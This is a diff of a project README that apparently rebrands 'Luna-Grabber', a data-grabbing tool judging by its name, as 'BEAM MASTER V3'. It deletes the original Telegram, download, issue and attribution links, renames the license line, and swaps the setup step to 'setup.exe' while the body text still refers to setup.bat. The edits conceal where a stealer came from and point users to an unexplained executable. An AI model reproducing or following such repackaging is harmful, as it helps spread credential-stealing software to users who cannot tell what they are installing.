@@ -17,7 +17,7 @@ BEAMMASTER V3
   <img  src="https://img.shields.io/github/issues-closed/Smug246/Luna-Grabber?color=6d00c1&logoColor=6d00c1">
   <br>
   <p align="center">
-  Telegram: https://t.me/lunaxsmug
+  
 <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
 </p>
 </div>
@@ -86,12 +86,10 @@ BEAMMASTER V3
 ```
 Make sure you have Python 3.11+ installed and it is added to your path.
 ```
-### 2. [Download](https://github.com/Smug246/Luna-Grabber/archive/refs/heads/main.zip) The Files:
-
 ```
 Once you've downloaded the files extract the folder so it's no longer a .zip file.
 ```
-### 3. Open The setup.bat File:
+### 3. Open The setup.exe File:
 
 ```
 You dont need to manually install any modules. Just opening setup.bat will install them for you. If successfull the setup.bat will then open up the gui.
@@ -135,23 +133,15 @@ The file you built will now appear in the current folder with the name you set.
 ## Contributing
 Contributions are a great way to keep the project active and up to date. Any contributions you make are **greatly appreciated**.
 
-If you have a suggestion that would make this project better, you can simply open a [feature request](https://github.com/Smug246/Luna-Grabber/issues/new?assignees=Smug246&labels=enhancement&projects=&template=feature_request.yml&title=feature%3A).
-Don't forget to give the project a star! Thanks again!
-
 1. Fork the Project
 2. Create your Feature Branch (`git checkout -b feature/NewFeature`)
 3. Commit your Changes (`git commit -m 'Add New Feature'`)
 4. Push to the Branch (`git push origin feature/NewFeature`)
 5. Open a Pull Request
 
-## Errors
-If you find an error that you cant fix and need help with you can submit an [issue](https://github.com/Smug246/Luna-Grabber/issues/) or join the [telegram](https://t.me/lunaxsmug) for support
+
 
 
 ## License
-Luna Grabber is distributed under the MIT License. See `LICENSE.md` for more information.
+BEAM MASTER is distributed under the MIT License. See `LICENSE.txt` for more information.
 
-
-## Star Graph
-
-![Star History Chart](https://api.star-history.com/svg?repos=Smug246/Luna-Grabber&type=Date)
